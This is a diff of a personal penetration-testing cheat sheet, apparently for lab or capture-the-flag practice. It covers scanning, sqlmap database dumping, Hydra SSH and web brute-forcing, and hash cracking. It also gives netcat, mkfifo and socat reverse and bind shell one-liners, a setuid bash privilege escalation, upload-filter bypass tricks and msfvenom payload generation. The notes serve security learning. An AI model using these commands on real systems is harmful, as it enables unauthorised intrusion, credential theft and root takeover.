@@ -1,64 +1,73 @@
-# nmap
+# Scanning
+## nmap
 scan - standard ports, standard scripts, enumerate versions, output to file
 ```
 nmap -sC -sV -oN <output_filename> <ip>
 ```
+
 scan - all ports, output to file
 ```
 nmap -p- -oN <output_file> <ip>
 ```
 
-# gobuster
+## gobuster
 directory scanning - common wordlist is directory-list-2.3-medium.txt from kali
 ```
 gobuster dir -u <url> -w <wordlist>
 ```
 
-# sqlmap
+# Injection
+## sqlmap
 basic sqlmap run, looking for data params in the --data argument
 ```
 sqlmap -u <url> --data 'a=aa&b=bbb'
 ```
+
 enumerate databases, --batch for no questions
 ```
 sqlmap -u <url> --data 'a=aaa&b=bbb' --batch --dbs
-``` 
+```
+
 enumerate tables
 ```
 sqlmap -u <url> --data 'a=aaa&b=bbb' --batch -D <database> --tables
-``` 
+```
+
 enumerate columns
 ```
 sqlmap -u <url> --data 'a=aaa&b=bbb' --batch -D <database> -T <table> --columns
-``` 
+```
+
 dump to stdin
 ```
 sqlmap -u <url> --data 'a=aaa&b=bbb' --batch -D <database> -T <table> --dump
-``` 
+```
 
-# Hydra
-## Bruteforcing SSH Passwords
+# Cracking
+
+A common file to use for cracking is `rockyou.txt`
+
+## Hydra
+Bruteforcing SSH Passwords
 ```
 hydra -l <username> -P <path to wordlist> <IP> ssh
 ```
 
-## Bruteforcing SSH Username
+Bruteforcing SSH Username
 ```
 hydra -L <path to wordlist> -p <password> <IP> ssh
 ```
 
-## Bruteforcing SSH Both
+Bruteforcing SSH Both
 ```
 hydra -L <path to username wordlist> -P <path to password wordlist> <IP> ssh
 ```
 
-## Bruteforcing Web
+Bruteforcing Web
 ```
 hydra -l admin -P ~/rockyou.txt 10.10.173.237 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid"
 ```
 
-
-# Hash Cracking
 ## John the ripper
 common list to use is rockyou.txt
 
@@ -66,21 +75,22 @@ basic crack:
 ```
 john <input file> --wordlist=<wordlist>
 ```
+For more info see [john-the-ripper.md](tools/john-the-ripper.md)
 
 ## Hashcat
 -Understand the hash you're cracking, if from shadow then use https://linuxize.com/post/etc-shadow-file/
+
 - Put hash in file, e.g. hashes.txt
 - for a SHA512 hash (starts $6$) using the rockyou.txt file:
 ```
 hashcat -m 1800 -a 0 hashes.txt ~/Downloads/rockyou.txt
 ```
-example hashes https://hashcat.net/wiki/doku.php?id=example_hashes
+Look up the `-m` param at https://hashcat.net/wiki/doku.php?id=example_hashes
 
 ## Crackstation
 Useful site for testing against lookup tables
-crackstation.net
+[crackstation.net](https://crackstation.net)
  
-
 # Web
 - view source looking for comments
 - try sql injection in logins (try usernames / passwords)
@@ -89,54 +99,32 @@ crackstation.net
     - ' (to see if it errors)
     - sqlmap
 
-# Reverse Shells
-revshells.com
+## Upload Bypass
+Try
+  - Changing the file extension (e.g. from .php to .php5)
+  - Changing the mime type via burp
+  - Hex editing the file to change the first few bytes
 
-- Get local ip address when on VPN
+# Reverse Shells
+The target is forced to execute code that connects back to your computer
+i.e. local listens, target connects
+
+Get shells from 
+- [revshells.com](https://revshells.com)
+- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [PentestMonkey](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+- [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)
+- On Kali go to `/usr/share/webshells`
+
+Get local ip address when on VPN
 ```
 ip a s tun0
 ```
+
 listen on local host
 ```
 nc -lnvp <port>
 ```
-
-# Local security bypass
-list allowed and forbidden commands
-```
-sudo -l
-```
-
-Info on how to abuse common commands https://gtfobins.github.io/
-the run with something like (username is in brackets from `sudo -l`)
-```
-sudo -u <user> /path/to/command <arguments>
-```
-
-if you can get into less then run
-```
-!bash
-```
-
-look for cron jobs that might run as root
-```
-cat /etc/crontab
-```
-
-if you can get root to run a script (i.e. through a cron job)
-then consider setting bash as setuid so it runs as root
-```
-chmod +s /bin/bash
-```
-then when it's it's setuid set (`ls -l /bin/bash`)
-(-p stops the effective user id from being set)
-```
-/bin/bash -p
-```
-
-# Reverse Shell
-The target is forced to execute code that connects back to your computer
-i.e. local listens, target connects
 
 ## Very simple reverse shell
 ```
@@ -147,26 +135,21 @@ then local machine
 nc -nlvp <port>
 ```
 
-## Cheat sheets
-- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-- [PentestMonkey](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
-
-## Shells
-- [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)
-- On Kali go to `/usr/share/webshells`
-
 ## Netcat
 Set up listener
-`sudo nc -lvnp 443`
+```
+sudo nc -lvnp 443
+```
 
 On the target
-`nc <Local_IP> <Port> -e /bin/bash`
+```
+nc <Local_IP> <Port> -e /bin/bash
+```
 
 To create a listener for a reverse shell (above might not be available in all nc distros):
 ```
 mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 ```
-
 
 ## Shell stabilisation
 These work for both reverse and bind shells
@@ -229,9 +212,8 @@ then in the remote shell
 `stty rows <number>`
 `stty cols <number>`
 
-
 # Bind Shell
-The code executed on the target is used to start a listener attacked to a shell directly on the target
+The code executed on the target is used to start a listener attached to a shell directly on the target
 i.e. target listens, local connects
 
 ## Netcat
@@ -262,13 +244,26 @@ Then on the attacking machine
 socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
 ```
 
-# Payload generation
+# Local security bypass
+if you can get root to run a script (i.e. through a cron job)
+then consider setting bash as setuid so it runs as root
+```
+chmod +s /bin/bash
+```
+then when it's it's setuid set (`ls -l /bin/bash`)
+(-p stops the effective user id from being set)
+```
+/bin/bash -p
+```
 
+# Payload generation
 ## msfvenom
 Part of metasploit
 
 Generate payloads with
-`msfvenom -p <payload> <options>`
+```
+msfvenom -p <payload> <options>
+```
 
 For example, to generate a Windows x64 Reverse Shell in an exe format
 
@@ -390,6 +385,16 @@ Then look up against https://gtfobins.github.io/#+capabilities
 
 ### Cron Jobs
 Check for system-wide cron jobs at /etc/crontab
+```
+cat /etc/crontab
+```
+Check if any run as root
+
+### Less
+if you can get into as root (e.g. through SUID) less then run
+```
+!bash
+```
 
 ### PATH
 Check if you have write permissions to a folder in PATH that you can exploit
@@ -566,10 +571,3 @@ Runs on the attack machine instead of the target, avoids AV.  https://github.com
 
 ## Tools
 - Chainsaw - https://github.com/countercept/chainsaw
-
-
-# Upload Bypass
-- Try
-  - Changing the file extension (e.g. from .php to .php5)
-  - Changing the mime type via burp
-  - Hex editing the file to change the first few bytes
